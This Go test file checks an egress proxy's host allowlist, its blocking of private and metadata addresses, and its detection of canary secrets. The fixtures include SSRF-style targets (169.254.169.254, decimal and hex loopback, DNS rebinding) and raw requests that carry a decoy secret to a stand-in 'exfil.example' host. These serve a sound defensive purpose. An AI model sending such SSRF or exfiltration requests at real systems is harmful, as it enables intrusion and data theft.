package egress

import (
	"bufio"
	"bytes"
	"context"
	"errors"
	"io"
	"net"
	"net/http"
	"net/netip"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

type fakeResolver map[string][]netip.Addr

func (r fakeResolver) LookupNetIP(_ context.Context, _, host string) ([]netip.Addr, error) {
	if a, ok := r[host]; ok {
		return a, nil
	}
	return nil, errors.New("no such host")
}

type denials struct {
	mu   sync.Mutex
	list []string
}

func (d *denials) add(host, reason string) {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.list = append(d.list, host+":"+reason)
}

func (d *denials) all() []string {
	d.mu.Lock()
	defer d.mu.Unlock()
	return append([]string(nil), d.list...)
}

// upstream is an in-memory network: every dial lands on an echo server and is
// recorded by address.
type upstream struct {
	mu     sync.Mutex
	dialed []string
	greet  string
}

func (u *upstream) dial(_ context.Context, _, addr string) (net.Conn, error) {
	u.mu.Lock()
	u.dialed = append(u.dialed, addr)
	u.mu.Unlock()
	a, b := net.Pipe()
	go func() {
		defer func() { _ = b.Close() }()
		br := bufio.NewReader(b)
		line, err := br.ReadString('\n')
		if err != nil {
			return
		}
		if strings.HasPrefix(line, "GET ") {
			_, _ = io.WriteString(b, "HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello")
			return
		}
		_, _ = io.WriteString(b, u.greet+strings.ToUpper(line))
	}()
	return a, nil
}

func (u *upstream) addrs() []string {
	u.mu.Lock()
	defer u.mu.Unlock()
	return append([]string(nil), u.dialed...)
}

func newProxy(t *testing.T, p Policy) (*Proxy, *upstream, *denials) {
	t.Helper()
	up := &upstream{greet: "echo:"}
	d := &denials{}
	return &Proxy{
		Policy: p,
		Resolver: fakeResolver{
			"api.example.com":    {netip.MustParseAddr("93.184.216.34")},
			"rebind.example.com": {netip.MustParseAddr("169.254.169.254")},
			"mixed.example.com":  {netip.MustParseAddr("10.0.0.5"), netip.MustParseAddr("93.184.216.35")},
			"v4mapped.example":   {netip.MustParseAddr("::ffff:127.0.0.1")},
		},
		Dial:   up.dial,
		OnDeny: d.add,
	}, up, d
}

// request sends raw bytes to the proxy and returns everything it answers.
func request(t *testing.T, p *Proxy, raw string, after string) string {
	t.Helper()
	client, server := net.Pipe()
	go p.ServeConn(server)
	_ = client.SetDeadline(time.Now().Add(5 * time.Second))
	_, err := io.WriteString(client, raw)
	require.NoError(t, err)
	if after != "" {
		// Wait for the head of the answer before tunnelling bytes.
		head, err := bufio.NewReader(client).ReadString('\n')
		require.NoError(t, err)
		if !strings.Contains(head, "200") {
			return head
		}
		_, err = io.WriteString(client, after)
		require.NoError(t, err)
	}
	out, _ := io.ReadAll(client)
	return string(out)
}

func TestConnectTunnelsToAnAllowedHost(t *testing.T) {
	p, up, d := newProxy(t, Policy{Allow: []string{"api.example.com:443"}})
	br := func() string {
		client, server := net.Pipe()
		go p.ServeConn(server)
		_ = client.SetDeadline(time.Now().Add(5 * time.Second))
		_, _ = io.WriteString(client, "CONNECT api.example.com:443 HTTP/1.1\r\nHost: api.example.com:443\r\n\r\n")
		r := bufio.NewReader(client)
		status, _ := r.ReadString('\n')
		for {
			l, _ := r.ReadString('\n')
			if l == "\r\n" || l == "" {
				break
			}
		}
		_, _ = io.WriteString(client, "ping\n")
		body, _ := r.ReadString('\n')
		return status + body
	}()
	assert.Contains(t, br, "200 Connection Established")
	assert.Contains(t, br, "echo:PING")
	assert.Equal(t, []string{"93.184.216.34:443"}, up.addrs())
	assert.Empty(t, d.all())
}

func TestConnectRefusals(t *testing.T) {
	policy := Policy{Allow: []string{"api.example.com:443", "rebind.example.com:443", "mixed.example.com:443", "v4mapped.example:443", "169.254.169.254:80", "10.0.0.7:443"}}
	for name, tc := range map[string]struct {
		target, reason string
		status         string
	}{
		"host outside the policy":       {"evil.example:443", "not_allowed", "403"},
		"allowed host, wrong port":      {"api.example.com:22", "not_allowed", "403"},
		"ip literal not named":          {"93.184.216.34:443", "ip_literal", "403"},
		"decimal ip":                    {"2130706433:443", "not_allowed", "403"},
		"hex ip":                        {"0x7f000001:443", "not_allowed", "403"},
		"zero address":                  {"0.0.0.0:443", "ip_literal", "403"},
		"ipv6 loopback":                 {"[::1]:443", "ip_literal", "403"},
		"metadata literal wrong port":   {"169.254.169.254:443", "ip_literal", "403"},
		"name rebinding to metadata":    {"rebind.example.com:443", "blocked_range", "403"},
		"v4-mapped loopback":            {"v4mapped.example:443", "blocked_range", "403"},
		"literal private named by host": {"10.0.0.7:443", "blocked_range", "403"},
		"localhost alias":               {"localhost:443", "not_allowed", "403"},
	} {
		t.Run(name, func(t *testing.T) {
			p, up, d := newProxy(t, policy)
			out := request(t, p, "CONNECT "+tc.target+" HTTP/1.1\r\nHost: "+tc.target+"\r\n\r\n", "")
			assert.Contains(t, out, " "+tc.status+" ")
			assert.Empty(t, up.addrs(), "nothing may be dialed")
			if tc.reason != "" {
				require.NotEmpty(t, d.all())
				assert.Contains(t, d.all()[0], tc.reason)
			}
		})
	}
}

func TestMixedAnswersDialOnlyPermittedAddresses(t *testing.T) {
	p, up, _ := newProxy(t, Policy{Allow: []string{"mixed.example.com:443"}})
	out := request(t, p, "CONNECT mixed.example.com:443 HTTP/1.1\r\nHost: mixed.example.com:443\r\n\r\n", "x\n")
	assert.Contains(t, out, "echo:X")
	assert.Equal(t, []string{"93.184.216.35:443"}, up.addrs())
}

func TestPolicyCanNameAPrivateAddress(t *testing.T) {
	p, up, _ := newProxy(t, Policy{Allow: []string{"10.0.0.7:443"}, AllowPrivate: []string{"10.0.0.0/24"}})
	out := request(t, p, "CONNECT 10.0.0.7:443 HTTP/1.1\r\nHost: 10.0.0.7:443\r\n\r\n", "x\n")
	assert.Contains(t, out, "echo:X")
	assert.Equal(t, []string{"10.0.0.7:443"}, up.addrs())

	p, _, _ = newProxy(t, Policy{Allow: []string{"10.0.0.7:443"}, AllowPrivate: []string{"10.0.0.7", "not an address"}})
	p.init()
	assert.True(t, p.privateAllowed(netip.MustParseAddr("10.0.0.7")))
	assert.False(t, p.privateAllowed(netip.MustParseAddr("10.0.0.8")))
}

func TestWildcardPatternsMatchBelowTheSuffixOnly(t *testing.T) {
	p, _, _ := newProxy(t, Policy{Allow: []string{"*.registry.example:443"}})
	assert.True(t, p.Allowed("a.registry.example", "443"))
	assert.True(t, p.Allowed("A.Registry.Example.", "443"))
	assert.False(t, p.Allowed("registry.example", "443"))
	assert.False(t, p.Allowed("evilregistry.example", "443"))
}

func TestPlainHTTPForwardsToAnAllowedHost(t *testing.T) {
	p, up, _ := newProxy(t, Policy{Allow: []string{"api.example.com:80"}})
	out := request(t, p, "GET http://api.example.com/x HTTP/1.1\r\nHost: api.example.com\r\n\r\n", "")
	assert.Contains(t, out, "200 OK")
	assert.Contains(t, out, "hello")
	assert.Equal(t, []string{"93.184.216.34:80"}, up.addrs())
}

func TestPlainHTTPRefusals(t *testing.T) {
	p, up, d := newProxy(t, Policy{Allow: []string{"api.example.com:80"}})
	out := request(t, p, "GET http://evil.example/ HTTP/1.1\r\nHost: evil.example\r\n\r\n", "")
	assert.Contains(t, out, "403")
	out = request(t, p, "GET /relative HTTP/1.1\r\nHost: api.example.com\r\n\r\n", "")
	assert.Contains(t, out, "400")
	assert.Empty(t, request(t, p, "GET http://a:b:c/ HTTP/1.1\r\nHost: x\r\n\r\n", ""), "an unparsable target is dropped")
	assert.Empty(t, up.addrs())
	assert.Equal(t, []string{"evil.example:not_allowed"}, d.all())
}

func TestUnreachableUpstreamIsABadGateway(t *testing.T) {
	p, _, _ := newProxy(t, Policy{Allow: []string{"api.example.com:443", "gone.example:443"}})
	p.Dial = func(context.Context, string, string) (net.Conn, error) { return nil, errors.New("refused") }
	out := request(t, p, "CONNECT api.example.com:443 HTTP/1.1\r\nHost: api.example.com:443\r\n\r\n", "")
	assert.Contains(t, out, "502")
	out = request(t, p, "CONNECT gone.example:443 HTTP/1.1\r\nHost: gone.example:443\r\n\r\n", "")
	assert.Contains(t, out, "502") // the name does not resolve

	p2, _, _ := newProxy(t, Policy{Allow: []string{"api.example.com:80"}})
	p2.Dial = func(context.Context, string, string) (net.Conn, error) { return nil, errors.New("refused") }
	assert.Contains(t, request(t, p2, "GET http://api.example.com/ HTTP/1.1\r\nHost: api.example.com\r\n\r\n", ""), "502")
}

func TestCanaryInARequestIsRefusedAndReported(t *testing.T) {
	const decoy = "klc-canary-stripe-0123456789abcdef"
	type tripped struct{ host, where string }
	cases := map[string]struct {
		raw   string
		where string
	}{
		"connect target": {"CONNECT " + decoy + ".exfil.example:443 HTTP/1.1\r\nHost: x\r\n\r\n", "connect_target"},
		"url":            {"GET http://api.example.com/?k=" + decoy + " HTTP/1.1\r\nHost: api.example.com\r\n\r\n", "url"},
		"escaped url":    {"GET http://api.example.com/?k=klc%2Dcanary%2Dstripe%2D0123456789abcdef HTTP/1.1\r\nHost: api.example.com\r\n\r\n", "url"},
		"header":         {"GET http://api.example.com/ HTTP/1.1\r\nHost: api.example.com\r\nX-Debug: " + decoy + "\r\n\r\n", "header:x-debug"},
		"body": {"POST http://api.example.com/ HTTP/1.1\r\nHost: api.example.com\r\nContent-Length: " + strconv.Itoa(len(decoy)+2) + "\r\n\r\n[" + decoy + "]",
			"body"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			p, up, _ := newProxy(t, Policy{Allow: []string{"api.example.com:80", decoy + ".exfil.example:443"}})
			var got []tripped
			p.Canary = func(b []byte) bool { return bytes.Contains(b, []byte(decoy)) }
			p.OnCanary = func(host, where string) { got = append(got, tripped{host, where}) }
			out := request(t, p, tc.raw, "")
			assert.Contains(t, out, "403")
			assert.Contains(t, out, "canary")
			require.Len(t, got, 1)
			assert.Equal(t, tc.where, got[0].where)
			assert.Empty(t, up.addrs(), "a request that carries a decoy is never forwarded")
		})
	}
}

func TestACleanRequestPassesTheCanaryCheck(t *testing.T) {
	p, up, _ := newProxy(t, Policy{Allow: []string{"api.example.com:80"}})
	p.Canary = func(b []byte) bool { return bytes.Contains(b, []byte("klc-canary")) }
	p.OnCanary = func(string, string) { t.Fatal("no decoy was sent") }
	out := request(t, p, "GET http://api.example.com/ HTTP/1.1\r\nHost: api.example.com\r\nX-Note: hello\r\n\r\n", "")
	assert.Contains(t, out, "200 OK")
	assert.Equal(t, []string{"93.184.216.34:80"}, up.addrs())
}

func TestGarbageIsDropped(t *testing.T) {
	p, up, _ := newProxy(t, Policy{Allow: []string{"api.example.com:443"}})
	assert.Empty(t, request(t, p, "\x16\x03\x01 not http\r\n\r\n", ""))
	assert.Empty(t, up.addrs())
}

func TestBlockedRanges(t *testing.T) {
	for _, s := range []string{"127.0.0.1", "10.1.2.3", "172.16.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0",
		"::1", "fe80::1", "fd00::1", "::ffff:10.0.0.1", "224.0.0.1", "64:ff9b::a00:1"} {
		assert.True(t, Blocked(netip.MustParseAddr(s)), s)
	}
	for _, s := range []string{"93.184.216.34", "1.1.1.1", "2606:4700::1111"} {
		assert.False(t, Blocked(netip.MustParseAddr(s)), s)
	}
}

func TestDefaultsAreUsableAndHeadersTrimmed(t *testing.T) {
	p := &Proxy{Policy: Policy{Allow: []string{"api.example.com:443"}}}
	p.init()
	assert.NotNil(t, p.Resolver)
	assert.NotNil(t, p.Dial)
	req, err := http.NewRequest(http.MethodGet, "http://api.example.com/", nil)
	require.NoError(t, err)
	assert.Equal(t, "api.example.com", req.URL.Host)
}
